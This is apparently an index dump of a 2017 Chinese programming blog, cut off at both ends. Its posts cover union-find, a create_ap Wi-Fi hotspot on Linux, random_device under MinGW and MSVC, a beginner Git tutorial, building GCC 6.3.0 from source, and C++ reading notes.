j = id[k]; id[k] = p; k = j; } while循环的退出条件是我们已经来到了根触点。在之前的遍历中，我们已经把当前根触点存到了p中，所以简单判断k!=p即可。接下来的第一行，我们把当前触点的前一个触点暂存到j中，然后下一行把当前触点的根触点更新为p，最后一行修改搜索索引k。短短三行代码就解决了！ 下面给出完整代码实现： class UF { public: UF(int n) { count = length = n; id = new int[n]; for (int i = 0; i \u003c length; i++) id[i] = i; sz = new int[n]; for (int i = 0; i \u003c length; i++) sz[i] = 1; } ~UF() { delete[] id; delete[] sz; } int getCount() { return count; } bool connected(int p, int q) { return find(p) == find(q); } int find(int p) { int k = p, j; while (p != id[p]) p = id[p]; while (k != p) { j = id[k]; id[k] = p; k = j; } return p; } void Union(int p, int q) { int pRoot = find(p); int qRoot = find(q); if (pRoot == qRoot) return; if (sz[pRoot] \u003c sz[qRoot]) { id[pRoot] = qRoot; sz[qRoot] += sz[pRoot]; } else { id[qRoot] = pRoot; sz[pRoot] += sz[qRoot]; } count--; } private: int count; int *id; int *sz; int length; }; 这就是全部了。 ","date":"2017-05-13","objectID":"/post/8ecb99c8/:1:4","tags":["算法","ACM-ICPC","并查集","技术","C++"],"title":"Ramen的算法笔记.1","uri":"/post/8ecb99c8/"},{"categories":["算法笔记"],"content":"5.讨论 能否再进一步优化？ 经过按秩合并的优化，我们的复杂度变为$O(NlgN)$，已经很不错了。而当我们进行了路径压缩优化后，这个复杂度更加变成了难以置信的十分接近于$O(N)$（十分接近于但是并没有达到）。而在研究之后，我们无奈的说，我们无法得到一个$O(N)$的算法，这是因为并非所有的操作都能在$O(1)$时间内完成，均摊成本无法到达1，所以我们可以得到的结论是： 按秩合并并进行路径压缩的算法是最优的并查集算法。 这也就是说，这个算法已经无法再进行优化了。但是一个成分十分接近于$O(N)$的算法已经十分实用了，不是吗？ 具体的成本分析需要较高的数学和概率统计基础，大家感兴趣可以自己搜索论文查看~~（简而言之就是我也不会~~ 我能否添加删除操作？ 诚然，数据结构中删除是一项十分基础的操作，然而遗憾的是，并没有任何人能发明既能兼顾删除操作又可以和本文所说的一些算法一样高效且简单的算法。换句话说，你可以使用无优化的树形结构来保存并实现删除操作，但是效率会大大降低。 ","date":"2017-05-13","objectID":"/post/8ecb99c8/:1:5","tags":["算法","ACM-ICPC","并查集","技术","C++"],"title":"Ramen的算法笔记.1","uri":"/post/8ecb99c8/"},{"categories":["算法笔记"],"content":"6.例题 两道简单的模板题，提高题目可能之后会有提高专场，本文还是以基础为主～~~（总而言之就是我现在不会~~ HDU 1232 畅通工程 此题十分简单，首先输入的是联通的城市，之后查询几个城市是否联通，那就直接建立并查集，合并，并使用connected(int p, int q)接口查询即可。 HDU 1198 Farm Irrigation 这道题有点意思，大意就是说这个农场有11种地块，按照先右后下的顺序告诉你每一种地块，然后问你我最少需要灌溉几次才能全部覆盖。 第一眼看上去是一个二维的数组，实际上远没有这么麻烦，直接从左往右数然后按一维编号即可。 第二个难点是联通的转化，首先选择你喜欢的方法把一个地块分解为四个方向，然后从A到K分别给每个地块赋予性质即可，我是使用的位运算。之后对于每一个地块检查右侧和下侧地块，检查上下左右连通性即可，如果联通就合并，不连通就拉倒，最后返回一下联通分量个数即可。因为要遍历一遍数组，所以复杂度是$O(N^2)$。 ","date":"2017-05-13","objectID":"/post/8ecb99c8/:1:6","tags":["算法","ACM-ICPC","并查集","技术","C++"],"title":"Ramen的算法笔记.1","uri":"/post/8ecb99c8/"},{"categories":["算法笔记"],"content":"7.引用 这篇文章的很多实现以及理论均来自《算法（第4版）》，P136～P149，对我帮助很大。 其次，路径压缩算法来自一篇CSDN博客并经过我简单修改，然而由于我看的时候离现在有点时间了，我也找不到了，暂且对原作者表示感谢吧。 ","date":"2017-05-13","objectID":"/post/8ecb99c8/:1:7","tags":["算法","ACM-ICPC","并查集","技术","C++"],"title":"Ramen的算法笔记.1","uri":"/post/8ecb99c8/"},{"categories":["日常笔记"],"content":"实验室只有有线网络，用Windows自然很方便，但是Linux下就很麻烦。 试过网上流传的各种方法，也尝试去装了ad-hotspot，都没效果。 今天去ad-hotspotGithub页面看到了create_ap这个项目，很快就把热点开起来了，简单记录一下。 ","date":"2017-05-04","objectID":"/post/58bcf4a2/:0:0","tags":["技术","Linux","Wifi热点","create_ap"],"title":"Linux下Wifi热点开启","uri":"/post/58bcf4a2/"},{"categories":["日常笔记"],"content":"1.准备 准备简单，这个东西依赖于以下软件包： bash util-linux procps or procps-ng hostapd iproute2 iw 不管是什么版本，包管理器跑一遍没有的自然会装上。 这里有两个注意，第一个是如果你的iw无法识别所有网卡，那请再装这个： iwconfig 第二个是，如果你要使用“NAT”共享网络，或者单纯就是开个内网，那请装这两个： dnsmasq iptables 装完了就结束了。之后直接安装就行： git clone https://github.com/oblique/create_ap cd create_ap sudo make install 这里要注意，Arch Linux和Gentoo有更加简便的安装方式，详细看项目主页。 ","date":"2017-05-04","objectID":"/post/58bcf4a2/:1:0","tags":["技术","Linux","Wifi热点","create_ap"],"title":"Linux下Wifi热点开启","uri":"/post/58bcf4a2/"},{"categories":["日常笔记"],"content":"2.使用 使用很简单，首先用ip link看一下你的所有网卡，看到如下结果： 2: enp109s0f1: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000 link/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff 3: wlp110s0: \u003cNO-CARRIER,BROADCAST,MULTICAST,UP\u003e mtu 1500 qdisc mq state DOWN mode DORMANT group default qlen 1000 link/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff 那么一般e开头的是有线网卡，w开头的是无线网卡。之后简单了，跑这个命令就行： sudo create_ap \u003c无线网卡名\u003e \u003c有线网卡名\u003e \u003cSSID\u003e \u003c密码\u003e 回车就能跑起来了。 还有更多的例子看项目的Github主页就行。 ","date":"2017-05-04","objectID":"/post/58bcf4a2/:2:0","tags":["技术","Linux","Wifi热点","create_ap"],"title":"Linux下Wifi热点开启","uri":"/post/58bcf4a2/"},{"categories":["日常笔记"],"content":"3.按服务启动(Systemd) 上面的跑起来后shell界面不能关，一关进程就终止了。create_ap可以启动为服务，依赖于systemd，你可以自己安装（Debian和Ubuntu自带），也可以看一下启动配置，给其他同类型服务写一份配置。 设置主目录在/etc/create_ap.conf，重点改这些： WIFI_IFACE=\u003c无线网卡名\u003e INTERNET_IFACE=\u003c有线网卡名\u003e SSID=\u003cSSID\u003e PASSPHRASE=\u003c密码\u003e 改好了存一波就能直接开启了： sudo service start create_ap 个人不推荐随机启动，你要是有需要就把上面的start换成enable就行。 好了，现在就掏出你的移动设备连上吧。 ","date":"2017-05-04","objectID":"/post/58bcf4a2/:3:0","tags":["技术","Linux","Wifi热点","create_ap"],"title":"Linux下Wifi热点开启","uri":"/post/58bcf4a2/"},{"categories":["技术笔记"],"content":"缘起 整个事情的起因是这样的： C++第四个实验要生成一组随机序列数，众所周知，rand()函数用的线性同余法生成随机数，但是这个随机数实际上是一个伪随机数。然后我就想用std::random_device来生成真随机数。然而在Windows下，GCC的表现却让我大跌眼镜。编译环境是MinGW gcc5.3.0。 ","date":"2017-05-01","objectID":"/post/a1ef2058/:1:0","tags":["C++","MSVC","GCC","C++11","技术"],"title":"Windows下的random_device","uri":"/post/a1ef2058/"},{"categories":["技术笔记"],"content":"不同的表现 首先是示例代码： #include \u003ciostream\u003e #include \u003cvector\u003e #include \u003crandom\u003e using namespace std; int main() { random_device rd; vector\u003cint\u003e v1, v2; while (v1.size() != 20) v1.push_back(rd() % 20 + 1); while (v2.size() != 20) v2.push_back(rd() % 20 + 1); for (const auto \u0026i : v1) cout \u003c\u003c i \u003c\u003c \" \"; cout \u003c\u003c endl; for (const auto \u0026i : v2) cout \u003c\u003c i \u003c\u003c \" \"; cout \u003c\u003c endl; return 0; } ","date":"2017-05-01","objectID":"/post/a1ef2058/:2:0","tags":["C++","MSVC","GCC","C++11","技术"],"title":"Windows下的random_device","uri":"/post/a1ef2058/"},{"categories":["技术笔记"],"content":"GCC的情况 代码本身含义再清晰不过，在Linux下跑出了满意的结果。但是在Windows下居然跑出来这种结果： 13 3 15 6 5 12 10 6 19 4 16 6 1 7 20 1 20 5 18 7 10 10 4 20 7 7 17 14 1 12 13 10 10 19 7 16 14 14 8 9 是随机数没错啊。然而我们再跑一遍： 13 3 15 6 5 12 10 6 19 4 16 6 1 7 20 1 20 5 18 7 10 10 4 20 7 7 17 14 1 12 13 10 10 19 7 16 14 14 8 9 ？？？ 我就很懵，这东西是不是在Windows下没用的？？？ ","date":"2017-05-01","objectID":"/post/a1ef2058/:2:1","tags":["C++","MSVC","GCC","C++11","技术"],"title":"Windows下的random_device","uri":"/post/a1ef2058/"},{"categories":["技术笔记"],"content":"MSVC的情况 然后我又用Visual Studio 2015跑了一遍。这是第一次的结果： 16 14 14 17 13 1 20 4 20 4 1 16 12 6 8 8 8 9 19 1 8 2 6 2 8 17 13 3 19 7 4 7 9 11 5 2 9 20 8 20 这是第二次： 13 15 12 6 13 5 13 2 8 7 14 13 9 7 15 16 4 20 11 10 6 11 9 17 8 20 15 5 14 9 12 14 5 1 4 20 3 1 19 15 ？？？ ","date":"2017-05-01","objectID":"/post/a1ef2058/:2:2","tags":["C++","MSVC","GCC","C++11","技术"],"title":"Windows下的random_device","uri":"/post/a1ef2058/"},{"categories":["技术笔记"],"content":"实现 本着无聊的原则，让我们看一下头文件： 没有什么头文件 实现都在.o里面的，我什么都没找到。 然后查阅了Stack overflow，看到如下问题： http://stackoverflow.com/questions/18880654/why-do-i-get-the-same-sequence-for-every-run-with-stdrandom-device-with-mingw 我跟着文章在cppreference看到这么一段话： std::random_device may be implemented in terms of an implementation-defined pseudo-random number engine if a non-deterministic source (e.g. a hardware device) is not available to the implementation. In this case each std::random_device object may generate the same number sequence. 那么实际上很明显了，windows下的GCC并没有完整实现std::random_device，所以才会出现多次随机序列一样的情况。（我猜就是直接 proxy 到rand()，种子都不换的） 那么MSVC呢？ http://stackoverflow.com/questions/9549357/the-implementation-of-random-device-in-vs2010 这里讲的很详细了，MSVC利用了很多数据来计算熵，然后使用RtlGenRandom()/SystemFunction036()来计算随机数，可以认为是真随机。 同时，在Linux下，GCC使用读取/dev/urandom的方式实现了std::random_device，这个文件本身就是一个真随机数（实际上，还是伪随机，想了解更多点这个）生成器，也就很完美的实现了。 ","date":"2017-05-01","objectID":"/post/a1ef2058/:3:0","tags":["C++","MSVC","GCC","C++11","技术"],"title":"Windows下的random_device","uri":"/post/a1ef2058/"},{"categories":["技术笔记"],"content":"结论 其实结论到现在就很简单了，如果你要在Windows下编译C程序，请首选MSVC编译器，微软投了这么多人力物力不是白做的。 如果你不想装Visual Studio这么大的IDE，你可以选择Code::Blocks，它可以选择使用MSVC作为编译环境，具体怎么搭独立的MSVC编译环境请使用搜索引擎；你还可以使用Visual Studio Code，这个是微软家做的文本编辑器，不得不说是真的无敌，自带了一份MSVC编译环境，小东西用它写足够了。 Linux下请选择Clang或者GCC（个人强烈推荐Clang，之后会写文章说为什么）。 Windows下真的推荐不要再使用MinGW或者Cygwin了，GCC本身诞生就不是给Windows写的，很多东西支持上不如MSVC。 以上都不要信，喜欢用啥就用啥。 反正我是换成MSVC了。 P.S. 写的好水啊，怎么能写出这么水的文章的，还是需要学习一波 ","date":"2017-05-01","objectID":"/post/a1ef2058/:4:0","tags":["C++","MSVC","GCC","C++11","技术"],"title":"Windows下的random_device","uri":"/post/a1ef2058/"},{"categories":["Music"],"content":"DDM要真的重启啦～～～～ 好久没写推荐手有点生，先写一遍练练手（ 这周一直在听Trance，可以说是十分中毒了，怕是点了一万个红心，今天就推这周听得比较多的歌吧。 Daybreak - D-Fender D-Fender不熟，但是在各种Trance专都能见到他。这首歌来自《Campaign for Real J-Trance Vol.02》，社团是RJT Music，就是专注于做J-Trance的一个社团。这首歌出现的十分惊喜，之前听错综的时候扫过一张专觉得很OK，然后有一天日推推了这个系列第四张的一首歌，我就开始扫过往碟了，结果这首歌十分抓耳。 这首歌作曲上来看，阶段感分明，前段靠bass和drum分别撑起来，中间Pad Solo之后配合恰到好处的bassline炒热气氛。但是最让我惊喜的是靠后段的Lead，真的有一种站起来的冲动，旋律搭配也是激昂，十分爽快，全程听下来完全没有迟疑，一环扣一环，个人十分喜欢，本周最爱了。 錯綜 - Memories of Noel 错综我听了也有大概十遍了，这首曲子真的是百听不厌。 这首歌同样也是我最喜欢的那种，段落感很强。但是这首歌和上面不同的是，每一个阶段都有惊喜。开头上来第一阶段没有太多额外的铺垫，直接钢琴旋律上场然后管弦乐器出现炒一波。中间段稳定的往下走旋律，渐渐引入，各种乐器都上了，drum踩拍子但存在感不薄弱，其他乐器维持主旋律的同时钢琴出来负责营造一种迷幻感。然后进入我认为最出色的段落，在一段十分像收尾段的钢琴+bass后，电吉他直接抢镜上线，整首曲子被推向真正的高潮，实在是太绝妙了。最后的结束让人意犹未尽，不得不再来一遍。 这首歌风格多变，而且每个段落发挥都十分稳定，质量实在是高。一定要听！ Industrial Nation - Jerico Trance中间混进来了一首Drun\u0026Bass，哈哈。这首歌红心点的很早了，有一天随机的时候听到了，莫名觉得十分好听，于是拿出来重听。有些歌可能就是这样，前几遍听感觉很平淡，但是越听越好听。 气氛渲染的很好，上来就营造了一种工厂的机械感，后面顺着这个节奏发展，drum有碎有稳，bass很魔，作曲有一种金属感，sample出现的我觉得很到位，听起来虽然波动起伏不大，但是总之不会让人觉得单调，适合干活的时候听。 上周大部分时间就在听这几首歌，先写这三首吧。 DDM新装复活后我们的日推也会于之后重生的！之后见啦！ （好久没写了感觉还是什么都不懂，需要加强学习了（（（ ","date":"2017-04-24","objectID":"/post/7a29ed05/:0:0","tags":["Music","Trance","推歌","推荐"],"title":"推歌","uri":"/post/7a29ed05/"},{"categories":["技术笔记"],"content":"上一篇Gogs的搭建写完之后，我稍微想了一下，可能很多人还是不懂什么是git，我们怎么用git。所以写一篇简单的文章来介绍一下什么是git和怎么使用git。 要注意，这篇教程内容并不多，只会教你上路和简单的问题处理，如果你想深入学习，文末会给出更多信息。 ","date":"2017-04-19","objectID":"/post/25568e5d/:0:0","tags":["技术","Git","版本管理"],"title":"A Brief Tutorial Of Git","uri":"/post/25568e5d/"},{"categories":["技术笔记"],"content":"0. 引言 无论是些什么，只要是做一个项目，总会有版本控制的说法。什么是版本控制呢？其实很简单，一份产品，就比如代码，在最终成型前肯定是有很多版本的，而版本管理系统出现就是为了帮你管理这些东西。 在git之前有很多版本管理系统，诸如SVN、Darcs等，而在git出现之后，几乎全世界都开始学习和选择git了——包括Google和微软、苹果等大型企业。 git是Linux之父Linus写的，诞生初衷就是为了给Linux的开发提供一个更好的版本管理工具，这里面还有个故事，有兴趣的同学搜搜看！ 值得称道的是，现在的git仍然保持着超凡的活力——2016年Git从v2.7升级到了v2.11，也就意味着有5大新特性被加入，代码提交量也比2015年多出15%。甚至这些代码的管理，也是通过git！ Talk is cheap, show me the code. - Linus Torvalds 相信大家已经了解到了Git的魅力了，那我们就开始讲解吧。 ","date":"2017-04-19","objectID":"/post/25568e5d/:0:1","tags":["技术","Git","版本管理"],"title":"A Brief Tutorial Of Git","uri":"/post/25568e5d/"},{"categories":["技术笔记"],"content":"1.安装 安装其实很简单。 如果你是Windows用户，官网下载最新版就行，双击.exe安装就够了。 如果你是Linux用户，使用包管理器安装就行，比如： sudo apt update sudo apt install git -y 如果你是Mac用户，用Homebrew装就够了，从官网下载或者安装Xcode也可以。 注意，在本篇教程不会讲如何使用GUI客户端来进行管理，一切都是跑在命令行下，如果你想获得有关GUI客户端的内容，可以看官网的GUI统计页面，这里不做更多讲解了。 ","date":"2017-04-19","objectID":"/post/25568e5d/:0:2","tags":["技术","Git","版本管理"],"title":"A Brief Tutorial Of Git","uri":"/post/25568e5d/"},{"categories":["技术笔记"],"content":"2.使用 注意：阅读此部分时默认你已经安装好了git而且会使用终端进行git操作。 新建一个库 欢迎开始使用git。首先，当我们要开始内容管理的时候，我们就需要新建一个库，告诉系统：兄弟，你给我管管这里的内容。 git init 图 1 提交内容 好了，当我安装完毕以后，我写了点东西，比如readme.md。 现在，让我们看一看git发现了些什么： git status 图 2 聪明！git已经发现了我们新建了一个readme.md，但是它不确定我们跟不跟踪。当然跟踪！让我们把它添加进去： git add readme.md 让我们现在再看一看现在的情况： git status 图 3 OK，看来git已经开始管理我们的文件了！让我们推送吧！ git commit -m \"Add readme.md\" 让我们再看看现在的情况 git status 图 4 结束啦！现在我们的readme.md已经被git接管了，大家可以放心修改。 修改文件与删除文件 好了，现在我加了两行内容，并且改了一点东西。 git status 图 5 等会儿，我忘了我刚才的readme.md是什么内容了，让我看看我改了些什么： git diff readme.md 图 6 说了些什么？ -/+的一组，说明你进行了修改，原先为-这一行，被你改成了+这一行 -这一行被删除了 +这一行是新增的 OK，看起来和我想的一样，推送了！ git add * git commit -m \"A test.cpp, test.c; M readme.md\" 图 7 回溯与取消暂存 Wait！test.c不应该提交啊！有大Bug！ git rm test.c git status 图 8 没错！推送了～ git commit -m \"D test.c\" ……等会儿，我刚刚想了一下，我没写出Bug！啊啊啊啊！ 吓得我看了看我的文件： ls 图 9 完了，血崩了。 嘿！不要急，让我们看看之前提交了什么： git log 图 10 哇，看到commit 66fc57567df98723f609842cf43b2b59bb672429这条commit的提交就知道我们在这里提交了test.c，迅速回溯到这一条上！ git reset --hard 66fc5756 不用写完，它会自己找那个版本。让我们看看怎么样了： git status ls 图 11 Yes！都回来了！ 提示：假如要回到上一个版本，则不用这么麻烦，使用git reset --hard HEAD^即可。 好了，老老实实干活吧。 git add * git status 图 12 且慢！我刚才加的这个文件似乎还没弄完，不应该现在提交的。 git reset HEAD important.c git status 图 13 OK啦，开始工作吧！ 到这里为止，你已经掌握了本地版本跟踪的有关内容了。当然，这并不是全部，很多高级仓库操作可以在更多部分看其他内容学习，但是你现在已经能管理自己的代码了，不是吗？ 简单复习 新建一个库：git init 跟踪文件：git add \u003c文件名\u003e 提交更新：git commit -m \"\u003c提交信息\u003e\" 查看状态：git status 查看修改：git diff \u003c文件名\u003e 删除文件：git rm \u003c文件名\u003e 查看提交历史：git log 版本回溯：git reset --hard \u003c版本号\u003e 撤销文件提交：git reset HEAD \u003c文件名\u003e ","date":"2017-04-19","objectID":"/post/25568e5d/:0:3","tags":["技术","Git","版本管理"],"title":"A Brief Tutorial Of Git","uri":"/post/25568e5d/"},{"categories":["技术笔记"],"content":"3.网络远程库 欢迎来到有关网络远程库的内容。 网络远程库以Github为例介绍，大家同样可以选择来自国内的优秀git托管服务如Coding或者开源中国（码云）。 怎么注册Github就不做过多提示了，直接前往Github主页跟着提示一步步来就行。 下面重点讲如何使用远程库： 设置你的用户名和邮箱 在一切操作之前，请先设置你的git用户名和邮箱 git config --global user.name \"\u003c用户名\u003e\" git config --global user.email \"\u003c邮箱\u003e\" 然后查看一下 git config user.name git config user.email 图 14 嗯，都对了。 创建仓库与初始化 点击右上角用户头像左边的加号，选择\"New repository\"，创建一个新的在线仓库，我把它命名为test。 图 15 之后你会看到这个页面： 图 16 这个页面上提供了4种方法来初始化这个仓库，让我们详细了解一下： 克隆 你可以看到它给出了一个链接，你可以使用 git clone \u003c链接\u003e 直接把仓库克隆到本地，当然了，克隆的时候会要求你不能克隆到已经内容的地方。 克隆后你可以使用你的账号直接推送上去。 新建仓库并关联到在线仓库 这六行命令讲了什么呢？ echo \"# test\" \u003e\u003e README.md 新建了一个README.md文件并把\"# test\"内容打进去。 git init git add README.md git commit -m \"first commit\" 这里大家应该都知道，初始化仓库→跟踪README.md，更新仓库。 关键是这两句： git remote add origin https://github.com/lxdlam/test.git git push -u origin master 这两行是关键，第一行说明了添加一个名字为\"origin\"的远程仓库，这个仓库地址为\"https://github.com/lxdlam/test.git\"。 第二行说明了把现有内容推送到origin这个远程仓库的master分支（这篇文章不讲分支的，请看更多部分来进行学习。） 注意：-u参数仅在首次使用时需要添加。 关联已有仓库到在线仓库 其实就是刚才所说的两行命令： git remote add origin https://github.com/lxdlam/test.git git push -u origin master 从其他地方导入代码 （这就触及到我的知识盲区了.jpg） 这部分不在本文的讨论内容中，略过～ 四个方法介绍完了，我们自然选择第三个。 图 17 在推送过程中，git会向你提出认证请求，登陆你的Github即可。（我的地址和你们看起来不一样，因为这是配置了SSH私钥的关系，这部分也不在本文讨论范围内）。 查看在线仓库以及获取更新 假设你在某个地方更新了内容，然后回到了家，想起来你写的那个功能没写完，那就下载下来写吧！ 首先看看改了什么： git fetch 这条命令会向在线仓库请求目前最新的状态信息，你发现有更新，于是 git pull 这条命令从在线仓库下载更新后的最新仓库。 图 18 好了，开始工作吧！ 解决冲突 这天你睡眼惺忪，在家写了个功能匆匆忙忙提交上去就跑了。然后你又在另一台电脑上写了个新功能，然后打算提交。但是你迷糊，git可不迷糊： 图 19 哇！尴尬！ 赶快看看是发生了什么： git fetch git status 图 20 按提示试试看： git pull Oops，好像不对，再看看是发生了什么： git status 图 21 这下结果很明显了，是ok.c出问题了。看看什么问题： git diff ok.c 图 22 提示符++\u003c\u003c\u003c\u003c\u003c\u003c\u003c HEAD下面的内容是当前本地HEAD分支下文件内容 提示符++=======分隔两个冲突分支 提示符++\u003e\u003e\u003e\u003e\u003e\u003e\u003e \u003ccommit id\u003e上面的内容是在commit id分支下的内容。 那么我们怎么解决这个冲突呢？ 我们可以编辑，比如备份一下本地的ok.c，然后改成和在线库一样，然后git pull，再做修改。 使用git mergetool，这是一个交互式合并工具，会挨个询问你冲突文件该怎么办，回答即可。 具体的自行选择吧。（关于mergetool的选择不在本文讨论范围内）。 最后不要忘了推送现在的修改： git push origin master 好了，介绍到现在也就结束了，相信你已经会使用自己的在线托管仓库了。 然而，这篇教程简单到根本没讲多人协作，所以你可以看更多部分的其他教程学习多人协作中多分支的使用、如何创建更新标签，以及如何设置忽略策略等。 简单复习 克隆一个在线仓库：git clone \u003c仓库地址\u003e 关联本地仓库到在线仓库：git remote add \u003c仓库名\u003e \u003c仓库地址\u003e 推送本地仓库：git push origin master 查看在线仓库信息：git fetch 从在线仓库下载更新：git pull 冲突解决的一般顺序：git fetch→git pull→git diff \u003c相关文件\u003e→进行冲突解决处理 ","date":"2017-04-19","objectID":"/post/25568e5d/:0:4","tags":["技术","Git","版本管理"],"title":"A Brief Tutorial Of Git","uri":"/post/25568e5d/"},{"categories":["技术笔记"],"content":"4.更多 正如开头所说，我只引大家上路并处理一下简单的问题，更多的操作，你可以参考： 廖雪峰大神的半小时git教程 Git官网的文档 当然，你也可以买两本书看看： 《Github入门与实践》 《GitHub实践》 当然了，Github也有很多玩法，比如用Pages托管一份自己的博客（我之后可能会写文）等等。 还有，你也可以选择搭建自己的Git服务，一台服务器，跑上一个Linux系统就行，选择腾讯云这些来搭建都是很推荐哒。具体你可以参考： 小型服务，低配置要求：Gogs（看我这篇文章） 大型服务，高配置要求：Gitlab 最关键的，现在你已经知道怎么获取他人的代码了，从现在开始，去Github上找自己喜欢的代码开始学习吧。 更大的世界等待着你！ ","date":"2017-04-19","objectID":"/post/25568e5d/:0:5","tags":["技术","Git","版本管理"],"title":"A Brief Tutorial Of Git","uri":"/post/25568e5d/"},{"categories":["技术笔记"],"content":"GCC，即The GNU Compiler Collection，是GNU计划的最关键组成部分。 GCC是一整套编译器的集合，大家使用的Code::Blocks使用的就是由MinGW提供的GCC编译套件。 刚刚看Debian 9的新闻的时候发现Debian 9将升级GCC到6，我看了一下，最让人振奋的是编译标准从C++98提升到了C++14，要知道C++11后这门语言已经大有不同，所以这个升级很让我心动。 GCC作为Linux最核心的一部分，没有提供现成的软件包直接安装，所以写一遍简短的笔记记一下安装过程，也给后来人参考。 文章发布时GCC 6最新的Release版本是6.3.0。安装的系统是Elementary OS 0.4，基于Ubuntu 16.04。 ","date":"2017-04-15","objectID":"/post/fa1ca4ee/:0:0","tags":["Linux","GCC","C++","技术"],"title":"GCC 6.3.0 手动编译安装","uri":"/post/fa1ca4ee/"},{"categories":["技术笔记"],"content":"1. 准备 准备环节很简单，肯定要下载GCC源码。同时，还需要四个必备软件包：m4、gmp、mpc、mpfr。 在这里推荐使用中科院开源软件协会的GNU镜像，速度飞快：http://mirrors.opencas.org/gnu。 gcc、gmp、mpc、mpfr都在此下载，m4直接用apt安装就行。 下载好直接解压，用tar zxvf \u003c文件名\u003e就可以了。 ","date":"2017-04-15","objectID":"/post/fa1ca4ee/:1:0","tags":["Linux","GCC","C++","技术"],"title":"GCC 6.3.0 手动编译安装","uri":"/post/fa1ca4ee/"},{"categories":["技术笔记"],"content":"2. 安装 安装顺序如下： 安装m4 直接跑命令行就行： sudo apt update \u0026\u0026 sudo apt install mp4 -y 安装gmp 解压后cd进去，直接安装： make clean ./configure --prefix=/usr/local/gmp-6.1.2 make sudo make install 安装mpfr 也是cd进去跑命令： make clean ./configure --prefix=/usr/local/mpfr-3.1.5 --with-gmp=/usr/local/gmp-6.1.2 make sudo make install 安装mpc （其实都是套路，我也不知道这里写什么好了 make clean ./configure --prefix=/usr/local/mpc-1.0.3 --with-gmp=/usr/local/gmp-6.1.2 \\ --with-mpfr=/usr/local/mpfr-3.1.5 make sudo make install 安装GCC 终于到重头戏了。 首先是配置： make clean ./configure --prefix=/usr --enable-threads=posix --enable-languages=c,c++ \\ --disable-multilib --with-gmp=/usr/local/gmp-6.1.2 \\ --with-mpfr=/usr/local/mpfr-3.1.5 --with-mpc=/usr/local/mpc-1.0.3 这个配置有两个地方需要注意： 我直接替换了本机的GCC。如果要独立并存安装，请修改--prefix参数。 我只启用了C和C++语言，你也可以启用更多的语言，修改-enable-languages即可。 接下来是漫长的编译过程： sudo make -j16 -j参数是多线程编译，理论上是CPU核心数两倍为宜，大家看情况调整。 编译很漫长，可以出去玩一会儿再回来（ 编译完成后可以安装，为了防止出现问题，请一定切换到root用户进行安装： su - make install 很快就装好啦～ ","date":"2017-04-15","objectID":"/post/fa1ca4ee/:2:0","tags":["Linux","GCC","C++","技术"],"title":"GCC 6.3.0 手动编译安装","uri":"/post/fa1ca4ee/"},{"categories":["技术笔记"],"content":"3. 测试 下面就是测试。 输入 gcc -v 可以看到返回： ... gcc 版本 6.3.0 (GCC) 编译了两个Hello World都正常。 下面测试C++11特性代码： #include \u003ciostream\u003e using namespace std; int main(){ int a[10]; for(auto \u0026i : a) i = 0; for(const auto \u0026i : a) cout \u003c\u003c i \u003c\u003c endl; return 0; } 不用加-std=c++11也能编译通过啦～ 现在就是默认C++14标准了，又可以开心coding了～ ","date":"2017-04-15","objectID":"/post/fa1ca4ee/:3:0","tags":["Linux","GCC","C++","技术"],"title":"GCC 6.3.0 手动编译安装","uri":"/post/fa1ca4ee/"},{"categories":["算法笔记"],"content":"大家好。 这一篇是Ramen的算法笔记系列序言。 最近参加了学校的“面向问题求解的高级程序设计”，说白了就是面向ACM的算法课。和竞赛大佬不同，我算法撑死也就写个暴力求子串的程度，实在是很菜，这次也就是想提升一下算法能力。算法这个东西，常用常新，所以写篇文章充当学习笔记，多多提升熟练度，未来如果读《算法导论》有什么理解更深的地方会另开文章写的。 这一系列文章主要写的都是自己比较喜欢的巧妙的算法，行文思路每次都有可能不同。 一般每篇文章的结构都像这样： 算法与数据结构的一般定义 问题的实际意义 正文，优化和代码实现 例题 因为我水平本来就不高，在基础里面讲的题目都会比较低级（因为我也只会做低级题QAQ 主要参考的资料是《算法》，就是那本橙书和《算法导论》，其他的引用我会在文章内说的。 语言使用C++，一般会把数据结构和操作写成一个类来定义基本操作，做题的时候会根据题目选择使用类或者修改实现。 其他应该没啥了，希望能坚持下去。 Fighting！ ","date":"2017-03-27","objectID":"/post/284f1385/:0:0","tags":["算法","ACM-ICPC"],"title":"Ramen的算法笔记.0","uri":"/post/284f1385/"},{"categories":["博客记录"],"content":"今天上邮箱才发现多说今年6月要停止服务了，因为没怎么用过所以不熟，也就不乱评论了。 更新了一下主题，发现能用的评论系统越来越多，我选了两个，网易云跟帖和LiveRe，我个人很喜欢LiveRe的评论框风格，但是这个东西我在国内访问速度比较捉急，而且是韩国人做的，至少现阶段我不想用。 所以最后换了网易云跟帖，应该大家能看到新评论系统了。 账号和网易跟帖是绑定的，来这里可以修改个人信息。 那就这样，Happy Reading! ","date":"2017-03-24","objectID":"/post/8ed03f38/:0:0","tags":["博客记录"],"title":"更换评论系统","uri":"/post/8ed03f38/"},{"categories":["读书笔记"],"content":"《C++ Primer Plus》读书笔记（1） 学校发的C++教材是那本比较经典的《C++大学基础教程（第五版）》，对于我来说内容太少了，所以C++课我都不看那本书，自己刷《C++ Primer Plus（第六版）》（下文简称CPP）。不得不说有一定基础来读这本书真的很舒服，更加详悉全面的讲了很多东西，收获颇多。这个是一个系列，在这更新一点看到的新东西和比较难理解的地方，以及在看书过程中查到的资料等，也算是定期复习。 虽然有覆盖页码这个说法，但是也不是每次都能写完，万一有就下次补充了～ ","date":"2017-03-23","objectID":"/post/f0cd48b4/:1:0","tags":["技术","技术笔记","C++","C++ Primer Plus","读书笔记"],"title":"CPP学习笔记(1)","uri":"/post/f0cd48b4/"},{"categories":["读书笔记"],"content":"覆盖页码：1~339 1. cin返回值 cin是一个对象，但是在输入的时候存在一个bool类型的返回值来表示文件是否到达末尾。也就是说： while(cin \u003e\u003e a){ ... } ... while(!cin.eof()){ cin \u003e\u003e a; ... } 其实是等价的。在很多时候处理输入就会比较方便。 2.传参效率 众所周知，C++存在三种传参方式。 //拷贝传参 int foo1(int a, int b); //指针传参 int foo2(int *a, int *b); //引用传参 int foo3(int \u0026a, int \u0026b); 它们之间的区别各种书都会讲，这里主要谈引用传参和拷贝传参的效率问题。从编译实现上来说，引用传参一般效率比较高，但是很多时候我们只是需要传入值去计算而不是修改原值，那么我们怎么做？很简单： //常规实现 int 